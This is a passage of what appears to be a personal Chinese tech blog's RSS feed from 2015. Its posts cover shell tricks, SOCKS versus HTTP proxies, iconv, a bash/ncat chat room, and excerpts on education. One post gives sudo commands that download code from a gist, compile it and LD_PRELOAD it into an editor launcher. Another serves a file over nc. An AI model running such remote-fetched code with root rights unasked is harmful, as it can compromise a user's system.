+ CDPATH  $ pwd /tmp $ cd mail -bash: cd: mail: No such file or directory [木有这个目录] $ export CDPATH=/etc # 或者直接 CDPATH=/etc $ cd mail /etc/mail [进去了!!!] $ pwd /etc/mail ps:CDPATH支持多个目录变量，比如，你可以CDPATH=$CDPATH:/home:/var/www:/etc:/opt，然后就可以切换到任意其中一个目录的子目录下，相当可爱～</description>
+    </item>
+    
+    <item>
+      <title>百度更懂中文？</title>
+      <link>https://wrfly.kfd.me/posts/%E7%99%BE%E5%BA%A6%E6%9B%B4%E6%87%82%E4%B8%AD%E6%96%87/</link>
+      <pubDate>Thu, 27 Aug 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E7%99%BE%E5%BA%A6%E6%9B%B4%E6%87%82%E4%B8%AD%E6%96%87/</guid>
+      <description>windwos下mysql密码忘了，于是就用谷歌搜了一下，虽然输入错了，但是结果却令我大吃一惊。
+对比下百度的结果，真是喜闻乐见了。</description>
+    </item>
+    
+    <item>
+      <title>SOCKS代理和HTTP代理的区别</title>
+      <link>https://wrfly.kfd.me/posts/socks%E4%BB%A3%E7%90%86%E5%92%8Chttp%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
+      <pubDate>Tue, 25 Aug 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/socks%E4%BB%A3%E7%90%86%E5%92%8Chttp%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
+      <description>翻译自http://www.jguru.com/faq/view.jsp?EID=227532
+括号里面都是我的注释，意会就好。
+SOCKS代理 本地浏览器SOCKS服务器通常是用来做代理的，它通过TCP连接把目标主机和客户端连接在一起， 并转发所有的流量。SOCKS代理能在任何端口，任何协议下运行（额，好想有点不对， 这货是运行在session层，所以在他之下的层他就无法代理了）。SOCKS V4只支持 TCP连接，而SOCKS V5在其基础上增加了安全认证以及对UDP协议的支持（也就是说， SOCKS5支持密码认证以及转发UDP流量，注意，HTTP是不支持转发UDP的）。
+SOCKS代理在任何情况下都不会中断server与client之间的数据（这是由这种协议的 特性决定的，毕竟非明文，但是在SOCKS代理服务器上还是可以还原出TCP和UDP的原始 流量的），当你的防火墙不允许你上网的时候，你就可以通过SOCKS代理来上网（这里的 意思是，如果GFW把google屏蔽了，你就可以通过一台海外的SOCKS代理服务器上谷歌）。
+大多数的浏览器都支持SOCKS代理（这篇文章是三年前的，抱歉，谷歌第一条就是它）。（ 浏览器上网的时候需要与目标主机建立TCP连接，这个时候浏览器就会告诉SOCKS代理，它想 与目标主机进行通讯，然后SOCKS代理就会转发浏览器的数据，并向目标主机发出请求，然 后再把返回的数据转发回来。）（关于shadowsocks的一点题外话：虽然github上的源码 没了，但是耐不住民间私货多呀。shadowsocks有server端和client端，这两个都是用 来转发数据的，但是由于其所处的位置不同，所以功能也不同，client即本地运行的程序， 监听1080端口，并将数据转发到远在他乡的SOCKS服务器，由于这种转发是加密的，在会话层， 所以GFW过滤的难度很大，所以才派人巴拉巴拉让作者删除源码，嗯，一定是这样的。然后server 那边收到数据后，会原原本本的把数据再向目标请求，收到反馈后再返回给本地client的1080端口， 这样，我们向本地的1080请求资源，本地向SOCKS服务器请求资源，SOCKS服务器向目标请求资源， 这一条TCP连接就这样建立起来了。）但是，但是，但是，SOCKS代理原则上是可以还原真实数据的， 所以，第三方的代理也许不是很可靠。
+（*原来还想画张图，画着画着实在太low了，果断Alt+F4*）
+HTTP代理 HTTP代理跟上面原理类似，用处也基本相同，都是让处于防火墙下的主机与外界建立连接，但是它与SOCKS代理不同的是，HTTP代理可以中断连接（即在中间截断数据流），因为HTTP代理是以HTTP请求为基础的 而这些请求大多以明文形式存在，所以HTTP代理可以在Client和下游服务器中间窃听，修改数据。但也正 由于HTTP代理只能处理HTTP请求，所以它对HTTP请求的处理也是很舒服的（原文中是smart）。而也由于 HTTP代理可以获取你的HTTP请求，所以HTTP代理服务器那边就可以根据你提交的数据来把那些资源缓存下来，提升访问的速度（用户亲密度+1）。有好多ISP都用HTTP代理，而不管用户那边的浏览器是怎样配置的，因为不管用户们怎么配置，他们总是要访问80端口，而这些80端口们又掌握在ISP们的手中。（原文完全不是这样说的= =。原文是说，互联网提供商们把流量都通过了HTTP代理，这样代理服务器中就有了缓存，访问的速度会快一些。）
+（我来举个栗子：假如你的HTTP代理是Goagent，监听本地127.0.0.1:8080，此刻假设你已经把浏览器 的代理设置为：127.0.0.1:8080，那么你在浏览器中，所有的POST，GET，以及其他的请求，都会通过 本地的代理转发给远程的服务器，然后再通过远程的服务器去请求你所请求的这些资源，大家知道，HTTP协议是通过明文传输的，无论是在本地还是远程的服务器上，都是可以监听到这些流量的，所以才会有GFW的存在……HTTP协议属于应用层，而SOCKS协议属于传输层，ps：传输层在网络层之下，这就决定了两者的能力大小。）
+拓展阅读  http://man.chinaunix.net/develop/rfc/RFC1928.txt http://server.zdnet.com.cn/server/2009/0213/1342779.shtml http://www.blogjava.net/zyskm/archive/2013/03/01/395914.html http://baike.baidu.com/view/751.htm  tcpdump下观察SOCKS代理和HTTP代理 先来一张乱码压压惊：
+上面这张图是我浏览谷歌主页的时候在wireshark里面监听到的内容，可以看到，乱码。我不知道是因为https的原因还是因为socks加密的原因，但是结果都一样，看不出这是啥内容。（但尽管如此，还是可以看到Google的，是吧）
+这张，是我访问 kfd.me 主页的时候所产生的HTTP请求，可以看到，每次GET请求之前都会跟着一个socks的握手，这是因为我请求的是本地资源（在浏览器看来），要先通过SOCKS建立一条TCP连接，然后再通过这条连接产生HTTP请求，第一行，序号是103的数据包先向对方表明了自己的socks版本以及要访问目标的端口号，以此让远程服务器对自己进行认证并转发数据。细心的同学可能已经注意到，箭头的方向就是数据流的方向，在这里，56059是本地端口号，socks是本地代理，即1080端口。（当初设计这些协议的人真厉害啊！）
+然后打开其中一个数据查看其详情，这个是第212个包，我们从下往上看（不是在楼梯从下往上看啊喂！），最下面那层，是HTTP协议，在往上，是SOCKS协议，这里可以更加直观的看到，HTTP是通过SOCKS进行的，再往上是传输层（TCP），再往上是互联网层（IPV4），再往上是链路层（ethernet，以太网），最上面是wireshark的frame协议。
+再上面这一张是通过socks访问某个网站的数据流，好像是谷歌，我忘了。。中间还穿插着https这样的证书认证，hello完了才可以传输数据，也是蛮好玩的。
+而这一张呢，是通过http代理获取一张图片的数据包，看他们的协议层就可以看出，HTTP直接通过TCP协议获取数据，而且HTTP协议又是明文传输的，所以……
+下载查看数据流 这是我保存下来的整个过程，可以用sublimetext查看里面的内容，当然，有些东西是乱码也是正常的，但是提取出来就可以看到内容，因为这就是原始数据嘛。
+如果想仔细观察这些数据包的话，你可以在安装了wireshark的情况下下载这些数据</description>
+    </item>
+    
+    <item>
+      <title>Oh-123</title>
+      <link>https://wrfly.kfd.me/posts/oh-123/</link>
+      <pubDate>Mon, 24 Aug 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/oh-123/</guid>
+      <description>这几天乱七八糟的，乱七八糟的人，乱七八糟的培训。
+安装DVWA啊，配置PHP啊，一天学会Python啊，21天当黑客啊…… 呵呵，太扯了。
+唯一让我觉得不扯的事情就是昨天跟WSK和LCY出去吃饭。
+还有我前几天开的那个 http://123.kfd.me
+其实很早就想做一个导航类的网站了，暑假太懒，那天傍晚忽然又想起来了，于是乎，拖到了第二天，终于从lofter找到一个模板当背景，添加链接上去。
+两年的收藏夹啊，一些资源网站，好玩的网站，有用的网站，偏僻的网站。配色有点暗，bigtang说我咋就这么喜欢黑色。嘿，我就喜欢了。
+大部分是关于Linux的，有部分是关于hack（web penetration test）的，少部分是关于音乐视频的。Oh，这就是我的生活了。
+昨天老胡说要交上周的报告，尼玛，啥报告啊，安装DVWA嘛，一天速成Python嘛，写个蛋啊。除了那个连接图片的还有点意思以外，别的我是真没兴趣（当然，也没做，也许还做不出来呢～），傲娇了。。
+所以我决定还是自己搞PT吧，争取两天完成一个pentesterlab上的镜像，然后再把那三个vuln.OS搞一搞，暑假的那几天学了学metasploit，也没派上多大用场。
+师父领进门，修行在个人。我tm连个师傅都没，要是自学成才了，那得戴一顶多大的帽子。
+嗯，就酱吧。</description>
+    </item>
+    
+    <item>
+      <title>如何背程序</title>
+      <link>https://wrfly.kfd.me/posts/%E5%A6%82%E4%BD%95%E8%83%8C%E7%A8%8B%E5%BA%8F/</link>
+      <pubDate>Tue, 18 Aug 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%A6%82%E4%BD%95%E8%83%8C%E7%A8%8B%E5%BA%8F/</guid>
+      <description>今天看慕课网的时候，看到关于编程思想的这一部分， 然后就看到Tony老师说如何“背”程序：
+ 抄写老师的程序并能正确运行。 为程序补全注释 删掉注释，为代码重新加注释 看注释写代码 删掉代码和注释，从头开始写  个人感觉还是很有道理的。
+毕竟，一段代码吃不透，下次再吃的时候，就会消化不良，就会拉肚子。
+&amp;ldquo;21天黑客速成&amp;rdquo;之类的东西还是少看。
+不花费大量的时间就想掌握一门技能，痴人说梦。</description>
+    </item>
+    
+    <item>
+      <title>fuser命令和lsof命令</title>
+      <link>https://wrfly.kfd.me/posts/fuser%E5%91%BD%E4%BB%A4%E5%92%8Clsof%E5%91%BD%E4%BB%A4/</link>
+      <pubDate>Sat, 08 Aug 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/fuser%E5%91%BD%E4%BB%A4%E5%92%8Clsof%E5%91%BD%E4%BB%A4/</guid>
+      <description>引子 前几天重装metasploit的时候，有几个端口一直被占用，记得以前有个命令是 可以根据端口号来确定进程号的，搜了一下，原来是fuser命令。
+fuser - identify processes using files or sockets.
+根据占用的文件或者socket来确定进程。好东西啊。
+fuser-几个常用的命令  fuser 8080/tcp 打印占用8080端口的进程 fuser /etc/passwd 打印占用/etc/passwd的进程 fuser -k 8080/tcp 杀死占用8080端口的进程  下面是来自thegeekstuff的关于fuser的一些介绍和技巧。To share and mark.
+文件或目录 $fuser . /home/mr/test: 13965c 可以看到进程ID后面跟了一个字母&amp;rsquo;c&amp;rsquo;，这个&amp;rsquo;c&amp;rsquo;其实是一个标识符，表示 这个进程把此目录作为他的当前目录。类似的还有：
+   参数 意义     c 当前目录   e 可执行文件正在运行   f 进程正在打开文件，默认省略   F 进程正在打开文件往里写入，默认省略   r 进程的根目录   m 内存映射，或者共享库    具体可以加上-v查看ACCESS详情，但是我感觉用处不大。另外-v还可以查看运行进程的用户是谁，运行的命令是什么， 这个还是很有用的。</description>
+    </item>
+    
+    <item>
+      <title>聊一聊转码</title>
+      <link>https://wrfly.kfd.me/posts/%E8%81%8A%E4%B8%80%E8%81%8A%E8%BD%AC%E7%A0%81/</link>
+      <pubDate>Tue, 04 Aug 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E8%81%8A%E4%B8%80%E8%81%8A%E8%BD%AC%E7%A0%81/</guid>
+      <description>iconv 要上密码学了，但是老师发的字幕在我的电脑上有点小问题，因为他们的编码格式是GBK编码 （Windows系统），而我的系统默认的编码是UTF-8，所以会造成有些应用打开的时候出现乱码， 或者干脆啥也没有。
+附上两个维基链接：
+GBK 编码 https://en.wikipedia.org/wiki/GBK
+UTF-8编码 https://en.wikipedia.org/wiki/UTF-8
+简而言之，gbk是国产的编码格式，UTF-8是国际化的编码格式。
+这就造成了我学习上的一些困扰，那么，该怎样解决这个问题呢？
+接下来就请出这篇文章的主角: iconv
+简单翻译一下iconv的man手册：
+ iconv - 把文字从一种格式转换成另一种格式。 如果没有给定输入文件的话，就从标准输入中读取， 如果没有给定输出文件的话，就将转换结果输出到标准输出当中。 默认的编码都是系统的本地默认编码。
+iconv [options] [-f from-encoding] [-t to-encoding] [inputfile]&amp;hellip;
+相关选项： * -f from-encoding (输入的编码格式，如 -f gbk) * -t to-encoding (输出的编码格式，如 -t utf8)
+如果 **//IGNORE** 跟在输出编码格式后面的话，不能正确转换的文字将会被抛弃，并且转换完成之后 将会打印出错误信息。（PS：不能正确转换的意思是，字符集里没有这个字，也包括那些生僻字哦～也就是说，如果这个编码能够被转换成乱七八糟的生僻字， 那么iconv是可以转换的，因为它“认识”这些生僻字，尽管你不认识。） 如果 **//TRANSLIT** 跟在输出编码后面的话，如果需要并且可能的话，源编码将会被音译为要转换的编码。 这就意味着，如果一个单词不能背转换为相应编码的时候，就会被读音相似，也可以说是拼写相似的单词所代替， 既不能被正确转换，也不能被音译的文字将会以 &amp;ldquo;?&amp;rdquo; 表示。 * -l 列出所有已知编码类型 * -c 丢弃那些不能背正确转换的编码，而不是遇到错误时停止。 * -o 后面跟着要输出的文件，例如 -o output.file * &amp;ndash;verbose 当处理多个文件时，打印进度信息到标准错误中。 * -?</description>
+    </item>
+    
+    <item>
+      <title>懒</title>
+      <link>https://wrfly.kfd.me/posts/%E6%87%92/</link>
+      <pubDate>Wed, 22 Jul 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E6%87%92/</guid>
+      <description>还是自己懒。
+临近期末了还不好好预习，连挣扎都不舍得挣扎一下。
+不想学那些没用的东西，不好玩，没意思。所以就把懒当做借口，把“学了没用”作为挡箭牌了。
+别人问我，你不学习你都干啥了，我支支吾吾答不上来。因为我也不知道自己干啥了，没有看书，没有写代码，没有搭建啥服务，也没有看电影。
+前几天看美剧，但是毕竟还看了点书，尽管我知道看完之后并没有什么卵用。Both books and movies.
+现在想想，到底什么有用呢？或许什么都没有用，什么都有用。想当年……学了那么多乱七八糟的都不如多跟，自己也没吐过一句槽。根茎叶花果种子……有个鸟用。都不如多跟人聊聊天，还能练练打字，以后敲代码也娴熟。
+真的是这样吗？
+我一直拿“学了没用”和“根本不感兴趣”来敷衍，因为我没有别的话可说了，因为我整个学期都没听过几次课，因为我没学这些东西，因为我没付出。所以，雪崩一旦开始就再也停不下来了。凭啥，凭啥挂科？就凭这个。
+但是好在我看开了，破罐子破摔的话，我也碎掉了～哈哈哈。
+这样也就没负担了，就像那些亡命之徒，早晚都是死，拉几个垫背的？
+早晚都毕不了业，干嘛不干点好玩的？
+于是乎，所以。
+并没有忘记自己的初心，也许我写不出windows这样的系统了，但是这也并不妨碍我成为一个hacker的计划。 要学的东西好多好多，时间是个大问题，我相信自己会有一个好的前程，毕竟……，是吧。
+多写代码少说话。
+本来嘛，大学就不是为了混毕业证的，拿了一纸文凭，还不是出来干活。啥？不会写代码？出去。
+所以这个毕业证我是不抱有太大希望了。嗯……要是老师开恩给个60，那我也不反对～
+懒。
+懒得字都不想打，书都不想翻，视频也懒得看，饭也懒得吃，算了，我还是去圈里呆着吧。
+宿舍里也乱七八糟的，只好带上耳机听音乐。
+写的也乱七八糟的，只好留给自己看。
+多年后再回首：“卧槽我当年期末的时候还这么懒。” 嗯，不错。</description>
+    </item>
+    
+    <item>
+      <title>Bash and NC chat room</title>
+      <link>https://wrfly.kfd.me/posts/bash-and-nc-chat-room/</link>
+      <pubDate>Tue, 07 Jul 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/bash-and-nc-chat-room/</guid>
+      <description>代码 https://gist.github.com/wrfly/3cafd411dc42822a9b16
+效果 ![nchat-1/img/nchat/1.png)
+![nchat-2/img/nchat/2.png)
+![nchat-3/img/nchat/3.png)
+介绍 一开始是为了计算机网络的大作业，说是要写一个聊天软件，要用socket，但是我C学的不好，觉得要是让我写C代码，至少得一周才能吃透，所以就想了个懒办法，Bash和Ncat。
+一开始的思路是让nc建立连接，通过echo输出，read读取，但是这样只能局限于NC那个界面，而且用户之间并没有标识，negative。
+期间接触了一点点bash网络编程的相关知识，比如exec 3&amp;lt;&amp;gt; /dev/tcp/127.0.0.1/80和echo &amp;quot;balabala&amp;quot; 1&amp;gt;&amp;amp;3和cat &amp;lt;&amp;amp;3
+A$ ncat -lp 8080 B$ exec 3&amp;lt;&amp;gt; /dev/tcp/127.0.0.1/80 B$ echo &amp;#34;balabala&amp;#34; 1&amp;gt;&amp;amp;3 B$ cat &amp;lt;&amp;amp;3 通过这种方式来绑定端口或者向端口IO
+信息加密解密方法：
+en(){ echo $1|openssl aes-256-cbc -k pass -e |openssl aes-256-cbc -k pass -d; } 这个小函数是用来测试加密解密的。
+然后说下脚本的思路：
+ 登陆，确定用户身份，用户名长度要过滤，防止恶意输入 房间选择，也要过滤，因为是要创建一个新的文档，所以必须过滤掉&amp;rdquo;. / \&amp;ldquo;等一系列特殊字符，默认是public房间，即所有用户输入输出均在public文件中。 消息IO，这个是聊天的核心，但是实现起来并不是很难，tail -f一直检测文件变化，因为所有的用户输入都保存到了“chat_room”这个文件里，当有新用户发言的时候所有同一房间下的用户都会收到消息，相当于群聊。如果是想两个人聊天，就可以两个人新建一个聊天室，也就相当于一对一的聊天了。 数据包格式，这个好弄，时间，用户名，消息数据。 安全性。远程的安全性永远的不到保障，所以只能在客户端解决。Wait~ 扩展：文件传输，表情包，tmux扩展，发送图片（asciiview）  问题  进程间通信，用tail读取文件 父进程退出之后，子进程不退出（tail -f &amp;ndash;pid $$） kill 命令用法 命令行输出颜色 （echo -e &amp;ldquo;balabala&amp;rdquo;） $$ 和 $!</description>
+    </item>
+    
+    <item>
+      <title>stardict&#39;s icon</title>
+      <link>https://wrfly.kfd.me/posts/stardicts-icon/</link>
+      <pubDate>Sun, 14 Jun 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/stardicts-icon/</guid>
+      <description>Boys and girls~
+由于stardict的图标是png格式的，放大之后那个锯齿哟……所以我就自己画了一个～
+把它放到/usr/share/app-install/icons/stardict.svg 然后修改/usr/share/applications/stardict.desktop的Icon=/usr/share/app-install/icons/stardict.svg.</description>
+    </item>
+    
+    <item>
+      <title>好玩的Linux命令行_II</title>
+      <link>https://wrfly.kfd.me/posts/%E5%A5%BD%E7%8E%A9%E7%9A%84linux%E5%91%BD%E4%BB%A4%E8%A1%8C_ii/</link>
+      <pubDate>Tue, 09 Jun 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%A5%BD%E7%8E%A9%E7%9A%84linux%E5%91%BD%E4%BB%A4%E8%A1%8C_ii/</guid>
+      <description>这条网站上统计了很多很多好玩有用的命令，感兴趣的同学可以看一下哦！ http://www.commandlinefu.com/commands/browse/sort-by-votes/
+下面这些是我从上面摘抄的，但是也请转载注明出处～
+先装上pv，然后再敲这一条，会把你帅呆了的！
+echo &amp;#34;You can simulate on-screen typing just like in the movies&amp;#34; | pv -qL 10 来，测试一下咱的硬盘有多快：
+timeout 2s yes &amp;#34;hello world!&amp;#34; &amp;gt; big_file &amp;amp; watch du -h big_file 常用的20条命令++
+history | awk &amp;#39;{a[$2]++}END{for(i in a){print a[i] &amp;#34; &amp;#34; i}}&amp;#39; | sort -rn | head 文字版星球大战!!!
+telnet towel.blinkenlights.nl 在终端右上角显示个表
+去tmp目录下逛一圈再回来(小括号代表子shell)
+(cd /tmp &amp;amp;&amp;amp; ls) nc用来传文件：
+nc -v -l 80 &amp;lt; file.ext 更改文件后缀名，把wrfly.png改成wrfly.jpg：
+mv wrfly.{png,jpg} 把命令的输出内容转换成图片，超酷炫：
+ifconfig | convert label:@- ip.</description>
+    </item>
+    
+    <item>
+      <title>These-days</title>
+      <link>https://wrfly.kfd.me/posts/these-days/</link>
+      <pubDate>Sun, 07 Jun 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/these-days/</guid>
+      <description>突如其来的就想用英语写点东西了，好，就用英语写篇不算日记的日记吧。
+Let&amp;rsquo;s talk about what i have done these days&amp;hellip;
+First, I took part in a CTF game and tried to figured out a problem which ask me to find a flag in a broken disk image.And, my disk was broken&amp;hellip;.
+Second, my GPT(GUID Partition Table) was broken and I lost lots of files.
+Third, I changed my HHD to a SSD.
+Not all yet.
+Finally I found all my files without filenames&amp;hellip;.</description>
+    </item>
+    
+    <item>
+      <title>让sublime text 支持中文输入（ubuntu）</title>
+      <link>https://wrfly.kfd.me/posts/%E8%AE%A9sublime-text-%E6%94%AF%E6%8C%81%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5ubuntu/</link>
+      <pubDate>Fri, 05 Jun 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E8%AE%A9sublime-text-%E6%94%AF%E6%8C%81%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5ubuntu/</guid>
+      <description>解决在ubuntu下用 sublime_text_3 输入中文的问题。
+只解决问题，不废话：
+cd /opt/sublime_text &amp;amp;&amp;amp;\ sudo wget &amp;#34;https://gist.githubusercontent.com/wrfly/baf1314ae25f41fe8cde/raw/45c669808bed8eb6d98fe6caa3f730076e5aede3/imfix.c&amp;#34; &amp;amp;&amp;amp;\ sudo apt-get install build-essential libgtk2.0-dev &amp;amp;&amp;amp;\ sudo gcc -shared -o imfix.so imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC &amp;amp;&amp;amp;\ sudo sed -i &amp;#34;s/exec/LD_PRELOAD=\/opt\/sublime_text\/imfix.so/&amp;#34; /usr/bin/subl &amp;amp;&amp;amp;\ sudo sed -i &amp;#34;s/\/opt\/sublime_text\/sublime_text/subl/g&amp;#34; /usr/share/applications/sublime_text.desktop &amp;amp;&amp;amp;\ echo &amp;#34;Succeed!&amp;#34; 如果你还嫌麻烦的话，没关系～
+一键安装脚本在这儿：
+wget https://gist.githubusercontent.com/wrfly/5f4187be96d93e95ad07/raw/15953c30b549efb4185df6d229324e465d279606/auto_imfix.sh 然后运行就好了 :)
+部分引用自http://html5beta.com/page/ubuntu-14-04-install-fcitx-sougoupinyin-sublime-text-3-chinese-input-fix.html</description>
+    </item>
+    
+    <item>
+      <title>乌合之众-教育篇</title>
+      <link>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87/</link>
+      <pubDate>Fri, 29 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87/</guid>
+      <description>第五条导火索：教育 　人们常常会持有一项错误的观点：教育能够使人大大改变。
+　这种观点坚持认为，教育会万无一失地改造民众，甚至于把他们变成平等的人。
+　这种观点被人们不断地重复，当它被重复得足够多时，就足以让它最终成为最牢固的民主信条。以至于今天要想击败这种观念，就像过去击败教会一样困难。
+　然而我们要说的是，教育既不会使人变得更道德，也不会使他更幸福；它既不能改变他的本能，也不能改变他天生的热情。
+　甚至在某些时候，只要进行不良引导，教育的坏处还会大于好处。
+　统计学家在这个方面为我们提供了佐证，根据他们的观点，犯罪随着教育，至少是某种教育的普及而增加，社会的一些最坏的敌人，也是在学校获奖者名单上有案可查的人。
+　根据一本著作显示，目前受过教育的罪犯和文盲罪犯的比率是3：1，在50年的时间里，人口中的犯罪比例从每10万居民227人上升到了552人，增长了整整1.3倍之多。
+　这一点在法国体现得尤为显著，因为法国的年轻人犯罪率大幅度攀升，而人尽皆知的是，法国为了这些年轻人，已经用免费义务制教育取代了交费制。而那些成为社会敌人的社会主义者，往往是受过高等教育的人群。
+　之所以会产生这样的危险状况，都是因为这种教育制度建立在一个错误的心理学基础上面，这种基础认为，智力是通过一心学好教科书来提高的，只要一个人的成绩足够好，那么他的智力就会获得稳步提高。
+　由于接受了这种观点，人们便尽可能强化许多手册中的知识。从小学直到离开大学，一个年轻人只能死记硬背书本，他的独立思考能力和个人意识从来派不上用场。受教育对于他来说就是背书和服从。
+　于是，许多孩子在学校里开始对着一篇篇语法和纲要努力，做到准确重复，出色模仿，直到变成学舌的鹦鹉为止，这种教育的惟一结果，就是贬低自我，让我们变得无能。
+　如果这种应试教育仅仅是无用，人们还可以对孩子们示以同情，这些虽然没有在小学里从事必要的学习，但好歹还被教会了一些科劳泰尔后裔的族谱、纽斯特里亚和奥斯特拉西亚之间的冲突或动物分类之类的知识。然而，这种制度造成的危险要远比这严重得多，一个最直接的后果就是，它使服从它的人强烈地厌恶自己的生活状态，极想逃之夭夭。
+　应试教育的结果是，工人不想再做工人，农民不想再当农民，而大多数中产阶级，除了吃国家职员这碗饭以外，不想让他们的儿子从事任何别的职业。学习的唯一目的不是让人为生活做好准备，而是只打算让他们从事政府的职业，在这样的行当里想要取得成功，根本不需要无需任何必要的自我定向，或表现出哪怕一点个人的主动性。
+　说到底，应试教育制度在社会等级的最底层创造了一支无产阶级大军，这个群体对自己的命运忿忿不平，随时都想起来造反。
+　而在最高层，它又培养出一群轻浮的权贵阶级，他们既多疑又轻信，对国家抱着迷信般的信任，把它视同天道，却又时时不忘对它表示敌意，总是把自己的过错推给政府，离开了当局的干涉，他们便一事无成。
+　尽管国家用教科书制造出这么多有文凭的人，然而它只能利用其中的一小部分，于是只好让另一些人无事可做。因此，它只能把饭碗留给先来的，剩下的没有得到职位的人便全都成了国家的敌人。
+　从社会金字塔的最高层到最低层，从最卑贱的小秘书到教授和警察局长，有大量炫耀着文凭的人在围攻各种政府部门的职位。商人想找到一个代替他处理殖民地生意的人难上加难，可是成千上万的人却在谋求最平庸的官差。
+　只在塞纳一地，就有几千名男女教师失业，这些人全都蔑视农田或工厂，只想从国家那儿讨生计，而被选中的人数却是有限的，因此肯定有大量心怀不满的人。他们随时会参与任何革命，不管它的头领是谁，也不管它有什么目标。
+　可以说，掌握一些派不上用场的知识，是让人造反的不二法门。</description>
+    </item>
+    
+    <item>
+      <title>乌合之众-教育篇 (题外话-上)</title>
+      <link>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87-%E9%A2%98%E5%A4%96%E8%AF%9D-%E4%B8%8A/</link>
+      <pubDate>Fri, 29 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87-%E9%A2%98%E5%A4%96%E8%AF%9D-%E4%B8%8A/</guid>
+      <description>关于应试教育的题外话（上） 　我们了解了引发群众运动的五大导火索，然而对于教育因素，我们还应当额外说上几句题外话。
+　很明显，法国在教育制度上犯了不小的错误，它进行的唯一价值就是，为这个多灾多难的国家添加了数以万计的懒汉、寄生虫和不安定因素。放眼全世界，犯下此种错误的民族还大有存在。
+　显然，迷途知返为时已晚。只有经验，这位民众最好的老师，最终会揭示出我们的错误。
+　只有经验能够证明，必须废除我们那些可恶的教科书和可悲的考试，代之以勤劳的教育，让我们的年轻人回到田野和工厂，回到他们今天不惜任何代价逃避的辛勤开拓事业。
+　我们必须再一次重申，向人灌输大量肤浅的知识，不出差错地背诵大量教科书，是绝对不可能提高人的智力水平的。
+　在我们的生活中，能够帮助我们走向成功的条件是判断力，是经验，是开拓精神和个性！而这些优良品质，偏偏是不能从死啃书本中得来的，教科书和字典固然可以充当有用的参考工具，但长久把它们放在脑子里却没有任何用处。
+　那么，我们该如何让孩子们接受到有益的教育，让它帮助孩子们获得正确的观念呢？
+　要知道，观念只有在自然而正常的环境中才能形成。
+　因此，我们需要年轻人每天从工厂、矿山、法庭、书房、建筑工地和医院获得大量的感官印象；他得亲眼看到各种工具、材料和操作；他得与顾客、工作者和劳动者在一起，不管他们干得是好是坏，也不管他们是赚是赔。
+　只有采用这种方式，孩子们才能对那些从眼睛、耳朵、双手甚至味觉中得到的各种细节，有些微不足道的理解。学习者在不知不觉中获得了这些细节，默默地推敲，在心中逐渐成形，并且或迟或早会产生出一些提示，让他们着手新的组合、简化、创意、改进或发明。
+　而我们的年轻人，却恰恰在最能出成果的年纪，被剥夺了所有这些宝贵的接触、所有这些不可缺少的学习因素，因为有七八年的时间他一直被关在学校里，切断了一切亲身体验的机会，因此对于世间的人和事，对于控制这些人和事的各种办法，不可能得到鲜明而准确的理解。
+　毫不客气地说，在十个人里面，就有九个人在几年里把他们的时间和努力浪费掉了，而且可以说，这是非常重要的、甚至是决定性的几年。他们中间有一半甚至三分之二的人，是为了考试而活着，然后被残酷地淘汰掉。
+　另外一半或者三分之一，成功地得到了某种学历、证书或一纸文凭在规定的某一天，坐在一把椅子上，面对一个答辩团，在连续两小时的时间里，怀着对科学家团体，即一切人类知识的活清单的敬畏，他们要做到正确或是绝对正确。
+　然后，甚至用不了一个月，他们便不再是这样。他们不可能再通过考试。他们脑子里那些过多的、过于沉重的所学不断流失，且没有新东西补充进去。他们的精神活力衰退了，他们继续成长的能力枯竭了，一个得到充分发展的人出现了，然而他也是个筋疲力尽的人。
+　他成家立业，落入生活的俗套，而只要落入这种俗套，他就会把自己封闭在狭隘的职业中，工作也许还算本份，但仅此而已。这就是平庸的生活，收益和风险不成比例的生活。</description>
+    </item>
+    
+    <item>
+      <title>乌合之众-教育篇 (题外话-下)</title>
+      <link>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87-%E9%A2%98%E5%A4%96%E8%AF%9D-%E4%B8%8B/</link>
+      <pubDate>Fri, 29 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87-%E9%A2%98%E5%A4%96%E8%AF%9D-%E4%B8%8B/</guid>
+      <description>关于应试教育的题外话（下） 　在教育青年人的方面，英国人与美国人明显做得更好。
+　英国并没有我们那样多的专业学校。他们的教育并不是建立在啃书本上，而是建立在专业课程上。
